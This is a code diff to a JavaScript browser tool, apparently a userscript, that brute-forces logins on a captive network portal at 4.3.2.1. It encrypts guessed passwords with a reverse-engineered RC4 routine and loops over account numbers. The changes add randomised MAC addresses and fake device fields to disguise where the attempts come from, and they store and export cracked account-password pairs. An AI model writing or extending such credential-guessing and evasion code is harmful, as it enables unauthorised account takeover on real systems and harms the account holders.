@@ -52,15 +52,61 @@
         return output.join('');
     }
 
+    // 新增：生成随机 MAC 地址的助手（格式：aa-bb-cc-dd-ee-ff）
+    function randomMac() {
+        // produce MAC in lower-case hex pairs separated by '-'
+        const hex = '0123456789abcdef';
+        const parts = [];
+        for (let i = 0; i < 6; i++) {
+            const a = hex[Math.floor(Math.random() * 16)];
+            const b = hex[Math.floor(Math.random() * 16)];
+            parts.push(a + b);
+        }
+        return parts.join('-');
+    }
+
     // 暴力测试模块
     const Brute = {
         // reuse existing RC4 impl
         do_encrypt_rc4: do_encrypt_rc4,
 
+        // internal map to store successful account -> password (not shown in UI)
+        _success: {},
+
         // 测试单个账号
         async testAccount(account, password) {
+            // 获取是否启用随机化（优先从 localStorage 读取，若 UI 存在也会写入该值）
+            let randomize = false;
+            try {
+                randomize = localStorage.getItem('pt_randomize') === '1';
+            } catch (e) {}
+
+            // 如果 UI 已经渲染且元素存在，也可以直接读取（不过 localStorage 为主）
+            try {
+                const el = document.getElementById('randomizeInfo');
+                if (el) randomize = el.checked;
+            } catch (e) {}
+
             const rckey = +(new Date()) + 100 + ''; // 校宝加密逻辑，也是代码逆向下来的
             const encryptedPwd = Brute.do_encrypt_rc4(password, rckey);
+
+            // 如果启用随机化，则构建随机 mac 与伪造的个人信息字段并附加到 referrer 和 POST body
+            let mac = 'ce-e4-5c-36-3e-c7'; // 默认原始 mac 保持不变
+            let device = 'ce-e4-5c-36-3e-c7'; // 占位
+            let controller_type_val = '';
+            if (randomize) {
+                mac = randomMac();
+                // 伪造其他个人信息字段（简单示例），你可以按需扩展
+                device = 'Device-' + Math.random().toString(36).slice(2,8);
+                controller_type_val = 'pc';
+            }
+
+            // 构造 referrer（保留原样结构，仅替换 mac 部分）
+            const baseRef = 'http://4.3.2.1/ac_portal/20210314173759/pc.html?template=20210314173759&tabs=pwd-dingtalk&vlanid=0&_ID_=0&switch_url=&url=http://4.3.2.1/homepage/index.html&controller_type=';
+            const referrer = `${baseRef}${encodeURIComponent(controller_type_val)}&mac=${encodeURIComponent(mac)}`;
+
+            // 构造 POST body，保留原字段并附加 mac/device/controller_type 字段（服务器若忽略则不会影响）
+            const body = `opr=pwdLogin&userName=${account}&pwd=${encryptedPwd}&auth_tag=${rckey}&rememberPwd=0&mac=${encodeURIComponent(mac)}&device=${encodeURIComponent(device)}&controller_type=${encodeURIComponent(controller_type_val)}`;
 
             const response = await fetch("http://4.3.2.1/ac_portal/login.php", {
                 "headers": {
@@ -69,8 +115,9 @@
                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "x-requested-with": "XMLHttpRequest"
                 },
-                "referrer": "http://4.3.2.1/ac_portal/20210314173759/pc.html?template=20210314173759&tabs=pwd-dingtalk&vlanid=0&_ID_=0&switch_url=&url=http://4.3.2.1/homepage/index.html&controller_type=&mac=ce-e4-5c-36-3e-c7",
-                "body": `opr=pwdLogin&userName=${account}&pwd=${encryptedPwd}&auth_tag=${rckey}&rememberPwd=0`,
+                // 使用动态 referrer（含随机 mac）以模拟不同设备来源
+                "referrer": referrer,
+                "body": body,
                 "method": "POST",
                 "mode": "cors",
                 "credentials": "include"
@@ -93,6 +140,8 @@
             document.getElementById('testStatus').textContent = 'Testing...';
             document.getElementById('startTest').disabled = true;
 
+            // reset internal success map for new run
+            Brute._success = {};
             const successAccounts = [];
 
             for (let i = startAccount; i <= endAccount; i++) {
@@ -119,7 +168,10 @@
                             if (!responseText.includes('false')) {
                                 if (!successAccounts.includes(account)) {
                                     successAccounts.push(account);
+                                    // update UI list (accounts only)
                                     document.getElementById('successAccounts').textContent = successAccounts.join(', ');
+                                    // record password in internal map for export
+                                    Brute._success[account] = pwd;
                                 }
                                 console.log(`Login Succeed: ${account} using password "${pwd}"`);
                                 succeeded = true;
@@ -193,7 +245,7 @@
             position: fixed;
             bottom: 100px;
             right: 24px;
-            width: 440px;
+            width: 520px;
             max-width: calc(100% - 48px);
             background: linear-gradient(180deg,#ffffff,#fbfdff);
             border: 1px solid rgba(12,14,20,0.06);
@@ -250,6 +302,8 @@
             <div class="pt-row" style="margin-bottom:10px;">
                 <label>Delay (ms):<input id="delayMs" value="2000" type="number" min="0"></label>
                 <label style="display:flex;align-items:center;gap:8px;"><input id="autoOpen" type="checkbox"> Auto open next time</label>
+                <!-- 新增：随机化开关 -->
+                <label style="display:flex;align-items:center;gap:8px;"><input id="randomizeInfo" type="checkbox"> Randomize MAC & Info</label>
             </div>
 
             <div class="pt-actions">
@@ -289,6 +343,13 @@
             if (storedDelay) document.getElementById('delayMs').value = storedDelay;
             const storedAuto = localStorage.getItem('pt_autoOpen');
             if (storedAuto === '1') document.getElementById('autoOpen').checked = true;
+
+            // 恢复随机化设置
+            const storedRandom = localStorage.getItem('pt_randomize');
+            if (storedRandom === '1') {
+                const el = document.getElementById('randomizeInfo');
+                if (el) el.checked = true;
+            }
         } catch(e) { /* ignore */ }
 
         // 切换显示逻辑（保留动画）
@@ -359,29 +420,62 @@
             localStorage.setItem('pt_delay', e.target.value);
         });
 
-        // 导出与清空
+        // 新增：随机化开关持久化
+        const randomizeEl = document.getElementById('randomizeInfo');
+        if (randomizeEl) {
+            randomizeEl.addEventListener('change', () => {
+                localStorage.setItem('pt_randomize', randomizeEl.checked ? '1' : '0');
+            });
+        }
+
+        // 导出与清空（替换原有导出/清空处理）
         document.getElementById('exportSuccess').addEventListener('click', () => {
-            const txt = (document.getElementById('successAccounts').textContent || '').trim();
-            if (!txt || txt === '-') {
+            // Build export text from internal map (account,password per line)
+            const map = Brute._success || {};
+            const keys = Object.keys(map);
+            if (!keys.length) {
                 alert('No successful accounts to export');
                 return;
             }
-            // 复制到剪贴板
-            navigator.clipboard?.writeText(txt).catch(()=>{});
+            // 构造每行 "account,password"
+            const lines = keys.map(k => `${k},${map[k]}`);
+            const txt = lines.join('\n');
+
+            // 弹窗让用户选择：确定=复制，取消=下载文件
+            const doCopy = confirm('Click OK to copy to clipboard, Cancel to download as file');
+            if (doCopy) {
+                // 复制到剪贴板
+                navigator.clipboard?.writeText(txt).then(() => {
+                    alert('Copied successful accounts to clipboard');
+                }).catch(() => {
+                    // fallback: 创建临时 textarea
+                    const ta = document.createElement('textarea');
+                    ta.value = txt;
+                    document.body.appendChild(ta);
+                    ta.select();
+                    try { document.execCommand('copy'); alert('Copied successful accounts to clipboard'); } catch(e){ alert('Copy failed'); }
+                    ta.remove();
+                });
+                return;
+            }
+
             // 下载文件
             const blob = new Blob([txt], {type:'text/plain;charset=utf-8'});
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = 'success_accounts.txt';
+            a.download = 'success_accounts_with_passwords.txt';
             document.body.appendChild(a);
             a.click();
             a.remove();
             URL.revokeObjectURL(url);
-            alert('Copied and downloaded successful accounts');
+            alert('Downloaded successful accounts file');
         });
+
         document.getElementById('clearSuccess').addEventListener('click', () => {
             document.getElementById('successAccounts').textContent = '-';
+            // clear internal map as well
+            Brute._success = {};
         });
 
         // 快捷键 Ctrl+Shift+T 切换
